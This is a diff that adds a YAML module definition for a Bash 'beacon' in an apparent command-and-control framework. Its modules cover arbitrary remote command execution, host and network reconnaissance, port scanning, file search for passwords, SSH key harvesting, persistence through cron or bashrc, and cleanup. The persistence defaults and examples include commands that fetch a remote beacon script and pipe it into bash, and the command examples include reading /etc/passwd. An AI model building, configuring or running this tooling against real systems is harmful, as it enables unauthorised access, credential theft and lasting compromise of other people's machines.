@@ -1,0 +1,313 @@
+schema_version: '1.1'
+beacon_info:
+  beacon_type: bash_oneliner_beacon
+  version: 1.0.0
+  description: Lightweight Bash one-liner beacon for Linux systems using only standard tools
+  supported_platforms:
+  - linux
+  encoding_strategy: plaintext
+  file_transfer_supported: false
+  keylogger_supported: false
+  supported_protocols:
+  - http
+categories:
+  basic_commands:
+    display_name: Basic Commands
+    description: Fundamental command execution capabilities
+    modules:
+      command_execution:
+        display_name: Command Execution
+        description: Execute arbitrary system commands
+        command_template: '{command}'
+        parameters:
+          command:
+            type: textarea
+            display_name: Command
+            description: Enter command to execute on the target system
+            required: true
+            default: 'whoami'
+            validation:
+              min_length: 1
+              max_length: 8192
+        documentation:
+          content: Execute system commands directly on the target machine. Commands are executed using bash eval with stderr and stdout capture. All standard Linux commands are supported.
+          examples:
+          - whoami
+          - ls -la
+          - ps aux
+          - netstat -tuln
+          - cat /etc/passwd
+          - find /tmp -name "*.txt"
+        execution:
+          timeout: 300
+          requires_admin: false
+        ui:
+          layout: simple
+  discovery:
+    display_name: Discovery & Reconnaissance
+    description: System and network reconnaissance capabilities
+    modules:
+      system_info:
+        display_name: System Information
+        description: Gather comprehensive system information
+        command_template: 'execute_module|SystemInfo'
+        parameters: {}
+        documentation:
+          content: Collect detailed system information including hostname, current user, UID/GID, groups, OS details, uptime, shell information, current directory, and process IDs.
+          examples:
+          - Basic system enumeration
+          - User context discovery
+        execution:
+          timeout: 60
+          requires_admin: false
+        ui:
+          layout: simple
+      process_enum:
+        display_name: Process Enumeration
+        description: Enumerate running processes on the system
+        command_template: 'execute_module|ProcessEnum'
+        parameters: {}
+        documentation:
+          content: Lists all running processes on the system using 'ps aux' or 'ps -ef' as fallback. Provides comprehensive process information for situational awareness.
+          examples:
+          - Process discovery for privilege escalation
+          - Identifying security tools
+        execution:
+          timeout: 30
+          requires_admin: false
+        ui:
+          layout: simple
+      network_enum:
+        display_name: Network Enumeration
+        description: Enumerate network interfaces and connections
+        command_template: 'execute_module|NetworkEnum'
+        parameters: {}
+        documentation:
+          content: Discovers network interfaces, IP addresses, and listening connections. Uses modern tools (ip, ss) with fallback to legacy tools (ifconfig, netstat).
+          examples:
+          - Network interface discovery
+          - Listening service identification
+        execution:
+          timeout: 60
+          requires_admin: false
+        ui:
+          layout: simple
+      user_enum:
+        display_name: User Enumeration
+        description: Enumerate system users and privileges
+        command_template: 'execute_module|UserEnum'
+        parameters: {}
+        documentation:
+          content: Enumerates current user details, group memberships, sudo access, and other users with shell access on the system.
+          examples:
+          - User account discovery
+          - Privilege escalation target identification
+        execution:
+          timeout: 30
+          requires_admin: false
+        ui:
+          layout: simple
+      service_enum:
+        display_name: Service Enumeration
+        description: Enumerate system services
+        command_template: 'execute_module|ServiceEnum'
+        parameters: {}
+        documentation:
+          content: Lists running system services using systemctl or service command as fallback. Identifies active services for attack surface analysis.
+          examples:
+          - Service discovery
+          - Identifying vulnerable services
+        execution:
+          timeout: 60
+          requires_admin: false
+        ui:
+          layout: simple
+      environment_enum:
+        display_name: Environment Enumeration
+        description: Enumerate environment variables and paths
+        command_template: 'execute_module|EnvironmentEnum'
+        parameters: {}
+        documentation:
+          content: Lists important environment variables including PATH, library paths, and user environment settings.
+          examples:
+          - Environment variable discovery
+          - PATH enumeration for privilege escalation
+        execution:
+          timeout: 30
+          requires_admin: false
+        ui:
+          layout: simple
+  scanning:
+    display_name: Network Scanning
+    description: Network reconnaissance and scanning capabilities
+    modules:
+      port_scan:
+        display_name: Port Scanner
+        description: Scan target hosts for open ports
+        command_template: 'execute_module|PortScan|{target},{ports}'
+        parameters:
+          target:
+            type: text
+            display_name: Target IP/Hostname
+            description: Target IP address or hostname to scan
+            required: true
+            default: '127.0.0.1'
+            validation:
+              min_length: 7
+              max_length: 253
+          ports:
+            type: text
+            display_name: Ports (comma-separated)
+            description: Comma-separated list of ports to scan (e.g., 80,443,3389)
+            required: true
+            default: '22,80,443,3389'
+            validation:
+              min_length: 2
+              max_length: 1000
+        documentation:
+          content: Performs TCP port scanning using bash built-in /dev/tcp functionality. Uses 3-second timeouts per port and provides simple open/closed status.
+          examples:
+          - '127.0.0.1,80,443,3389'
+          - '192.168.1.1,22,23,80,135,139,445'
+        execution:
+          timeout: 300
+          requires_admin: false
+        ui:
+          layout: simple
+      dns_enum:
+        display_name: DNS Enumeration
+        description: Enumerate DNS records for a domain
+        command_template: 'execute_module|DNSEnum|{domain}'
+        parameters:
+          domain:
+            type: text
+            display_name: Domain Name
+            description: Domain name to enumerate DNS records for
+            required: true
+            default: 'example.com'
+            validation:
+              min_length: 3
+              max_length: 253
+        documentation:
+          content: Performs DNS enumeration using nslookup or dig as fallback. Provides basic DNS record information for the specified domain.
+          examples:
+          - 'google.com'
+          - 'microsoft.com'
+        execution:
+          timeout: 120
+          requires_admin: false
+        ui:
+          layout: simple
+  file_operations:
+    display_name: File Operations
+    description: File system operations and search capabilities
+    modules:
+      file_search:
+        display_name: File Search
+        description: Search for files matching a pattern
+        command_template: 'execute_module|FileSearch|{directory},{pattern}'
+        parameters:
+          directory:
+            type: directory
+            display_name: Search Directory
+            description: Directory to search in (recursively)
+            required: true
+            default: '/tmp'
+            validation:
+              min_length: 1
+              max_length: 500
+          pattern:
+            type: text
+            display_name: Search Pattern
+            description: File name pattern to search for (case-insensitive substring match)
+            required: true
+            default: 'txt'
+            validation:
+              min_length: 1
+              max_length: 100
+        documentation:
+          content: Recursively searches for files matching the specified pattern using the find command. Returns up to 100 results to prevent excessive output.
+          examples:
+          - '/home,password'
+          - '/var,log'
+          - '/etc,conf'
+        execution:
+          timeout: 180
+          requires_admin: false
+        ui:
+          layout: simple
+  credential_harvesting:
+    display_name: Credential Harvesting
+    description: Discover and analyze stored credentials and keys
+    modules:
+      ssh_key_discovery:
+        display_name: SSH Key Discovery
+        description: Discover SSH private keys, public keys, and configuration
+        command_template: 'execute_module|SSH_Discovery'
+        parameters: {}
+        documentation:
+          content: Searches for SSH keys in the user's .ssh directory, identifies key types, and provides information about SSH configuration and known hosts.
+          examples:
+          - SSH key enumeration
+          - SSH configuration analysis
+        execution:
+          timeout: 30
+          requires_admin: false
+        ui:
+          layout: simple
+  persistence:
+    display_name: Persistence Mechanisms
+    description: Establish persistence across system reboots
+    modules:
+      persistence:
+        display_name: Basic Persistence
+        description: Create basic persistence mechanisms
+        command_template: 'execute_module|Persistence|{method},{command}'
+        parameters:
+          method:
+            type: choice
+            display_name: Persistence Method
+            description: Method to use for persistence
+            required: true
+            default: 'cron'
+            choices:
+            - cron
+            - bashrc
+          command:
+            type: text
+            display_name: Command to Execute
+            description: Command to execute for persistence
+            required: true
+            default: 'curl -s http://example.com/beacon.sh | bash'
+            validation:
+              min_length: 1
+              max_length: 500
+        documentation:
+          content: Creates basic persistence mechanisms using cron jobs or bashrc modifications. Limited to user-level persistence without elevated privileges.
+          examples:
+          - 'cron,curl -s http://192.168.1.100/beacon.sh | bash'
+          - 'bashrc,echo "backdoor" > /tmp/.backdoor'
+        execution:
+          timeout: 60
+          requires_admin: false
+        ui:
+          layout: simple
+  maintenance:
+    display_name: Beacon Maintenance
+    description: Beacon control and cleanup operations
+    modules:
+      cleanup:
+        display_name: Cleanup & Shutdown
+        description: Stop beacon and perform cleanup
+        command_template: 'execute_module|Cleanup'
+        parameters: {}
+        documentation:
+          content: Stops the beacon process and performs basic cleanup. The beacon will send a final status message before terminating itself.
+          examples:
+          - Graceful beacon shutdown
+          - Emergency cleanup
+        execution:
+          timeout: 30
+          requires_admin: false
+        ui:
+          layout: simple
